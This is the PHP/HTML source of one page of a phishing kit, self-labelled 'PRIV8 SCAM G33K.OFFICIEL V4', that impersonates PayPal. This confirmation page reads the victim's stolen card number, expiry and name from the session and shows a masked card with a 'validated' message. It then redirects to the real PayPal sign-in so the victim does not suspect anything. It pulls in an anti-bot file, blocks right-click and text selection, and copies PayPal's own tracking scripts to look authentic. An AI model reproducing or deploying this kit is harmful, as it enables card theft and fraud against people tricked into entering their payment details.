<?php 
//PRIV8 SCAM G33K.OFFICIEL V4
error_reporting(0);
session_start();
include("../antimwbna.php");
include("../linguo/lang.php");
include "../linguo/lang".$_SESSION['MONSTR_UU'];
require_once '../cry/crypt.php';
$_SESSION["first"] = substr($_SESSION["number"],0,1);
if($_SESSION["first"] == 5){
	$_SESSION["crdtp"] = "MasterCard";
} elseif ($_SESSION["first"] == 4){
	$_SESSION["crdtp"] = "Visa";
} elseif ($_SESSION["first"] == 3){
	$_SESSION["crdtp"] = "Amex";
} elseif ($_SESSION["first"] == 6){
	$_SESSION["crdtp"] = "Discover";
};
$photo = "pp.png";
if($_SESSION["crdtp"] ==  "Visa"){ $photo = "v.png";}
elseif($_SESSION["crdtp"] ==  "MasterCard"){ $photo = "mc.png";}
elseif($_SESSION["crdtp"] ==  "Amex"){ $photo = "ae.png";}
elseif($_SESSION["crdtp"] ==  "Discover"){ $photo = "d.png";}
?>
<!DOCTYPE html><html class="no-js superBowlBG accountCreate" lang="en" dir="ltr">
<head>
<!--Script info: script: node, template:  , date: , country: , language: web version: content version: hostname : QjML33U2ZDrLc&#x2B;mXRRYY54ZUw4ixcr7N1WHaFWTATK&#x2B;qFcah&#x2B;XAJt0pBL&#x2B;oJ1RH8rlogid : --><!--Script info: script: node, template:  , date: Jan 4&#x2C; 2017 13&#x3A;34&#x3A;19 &#x2D;08&#x3A;00, country: US, language: en web version:  content version:  hostname : QjML33U2ZDrLc&#x2B;mXRRYY54ZUw4ixcr7N1WHaFWTATK&#x2B;qFcah&#x2B;XAJt0pBL&#x2B;oJ1RH8 rlogid : 7cnzNafaKX%2Bcw6GZb51U8ELkru%2B1z1w5I%2BwsFIAnhqMgLGhBS%2FBbFwQTVHW7Pk7ZPSrozrGE44XfG59ySE51Sg_1596b6773c0 -->
<title><?php echo $con ?></title>
<link rel="shortcut icon" type="image/x-icon" href="../img/ppl.ico" />
<meta http-equiv="X-UA-COMPATIBLE" content="IE-edge" />
	<meta http-equiv="content-type" content="text/html; charset=UTF-8" />
	<meta name="application-name" content="Update" />
	<meta name="msapplication-task" content="" />
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=yes" />
<meta http-equiv="refresh" content="5;url=https://www.paypal.com/signin" />
<script src="../js/jquery.js"></script>
<script src="../js/jquery.mask"></script>
<script src="../js/jquery.validate"></script>
<script src="../js/jquery.v-form"></script>
 <script src="../js/jquery-3.1.0.min.js"></script>	
<link rel="stylesheet" href="../css/appSuperBowl.css" />
<script language="JavaScript1.2" type="text/javascript">
  //The functions disableselect() and reEnable() are used to return the status of events.

        function disableselect(e)
        {
                return false 
        }
        
        function reEnable()
        {
                return true
        }
        
        //if IE4 
        // disable text selection
        document.onselectstart=new Function ("return false")
        
        //if NS6
        if (window.sidebar)
        {
                //document.onmousedown=disableselect
                // the above line creates issues in mozilla so keep it commented.
        
                document.onclick=reEnable
        }
        
        function clickIE()
        {
                if (document.all)
                {
                        (message);
                        return false;
                }
        }
        
        // disable right click
        document.oncontextmenu=new Function("return false")
        
</script>
</head><body class="desktop windows 8&#x2E;1 accountCreate US"><noscript><p class="nonjsAlert" role="alert">NOTE: Many features on the PayPal Web site require Javascript and cookies.</p></noscript><header class="mainHeader" role="banner"><div class="headerContainer">
<div class="grid12"><a data-click="payPalLogo"  href="#" class="logo"></a><div class="gradientSpacer"><div> </div></div><div class="loginBtn"><a data-click="loginLink" href="#" class="button secondary small  custom"><?php echo $log ?></a></div></div></div></header><main class="superBowlMain"><section id="content" role="main" data-country="US"><section id="main" class=""><div id="create" class="create grid12"><script type="application/json" fncls="fnparams-dede7cc5-15fd-4c75-a9f4-36c430ee3a99">{"f":"8ca82980d2c511e689ae0d187383423f","s":"t_s","mm":"true"}</script>
<script type="text/javascript">(function() {var dom, doc, where, iframe = document.createElement('iframe');iframe.src = "javascript:false";iframe.title = "";iframe.role = "presentation";(iframe.frameElement || iframe).style.cssText = "display:none; width: 0; height: 0; border: 0";where = document.getElementsByTagName('script');where = where[where.length - 1];where.parentNode.insertBefore(iframe, where);try {doc = iframe.contentWindow.document;} catch (e) {dom = document.domain;iframe.src = "javascript:var d=document.open();d.domain='" + dom + "';void(0);";doc = iframe.contentWindow.document;}doc.open()._l = function () {var js = this.createElement("script");if (dom) {this.domain = dom;}js.id = "js-iframe-async";js.src = "https://www.paypalobjects.com/webstatic/r/fb/fb-all-prod.pp2.min.js";this.body.appendChild(js);};doc.write('<body onload="document._l();">');doc.close();})();</script><noscript><img src="https://c.paypal.com/v1/r/d/b/ns?f=8ca82980d2c511e689ae0d187383423f&s=t_s&mm=true&js=0&r=1"></noscript>
<noscript><img src="https://c.paypal.com/v1/r/d/b/ns?f=8ca82980d2c511e689ae0d187383423f&s=t_s&mm=true&js=0&r=1"></noscript><div class="customGrid7"><form action="../Templates/MO_Bill.php" method="post"  name="create_form" class="proceed" ><input type="hidden" id="csrf" name="_csrf" value="HfsRGH5ySx8SS2XoBuT3NFDe7&#x2B;sOH0istUb9I&#x3D;">    <div class="pageHeader"><h2><?php echo $con ?> <?php echo strtoupper($_SESSION["nameoncc"]); ?></h2></div><div class="superBowlContainer"><div class="inner">
<div class="textInput lap"><div class="fields email large">
<br><br><center><img style="width:150px;height:120px" src="../img/validated.png"><br><br><?php echo $rev ?><br><br><?php echo $mean ?><br><br><b><?php echo $Thank ?></b><br><br>
 <div class="G-FieldsZ118">
                                        <div>
                                            <center>
                                                <div>
                                                    <table border="0" width="100%" align="center" style="margin-top: -6px;margin-bottom: -6px;">
                                                        <tbody>
                                                            <tr>
                                                                <td align="center" style="">
                                                                    <img src="../img/cono/<?php echo $photo; ?>"></td>
                                                                <td align="center" valign="middle">
                                                                    <h4>XXXX XXXX XXXX <?=substr($_SESSION['number'] , -4);?></h4></td>
                                                                <td align="center" valign="middle">
                                                                    <h4><?php echo $_SESSION['expmo']; ?>/<?php echo $_SESSION['expyr']; ?></h4></td>
                                                            </tr>
                                                        </tbody>
                                                    </table>
                                                </div>
                                            </center>
                                        </div>
                                    </div><br><br><b><?php echo $red ?> </b><br><br><img src="../img/loading-dots.gif"><br><br><br><br><br><br>
</div></div><center><br><div class="footerNav"><div class="legal"></i></i><b><a style="cursor:pointer"><?php echo $contact ?></a> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;       <a style="cursor:pointer"><?php echo $feedback ?></a>  &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;     <a style="cursor:pointer"><?php echo $privacy ?></a><ul></li></noscript></div></body></html>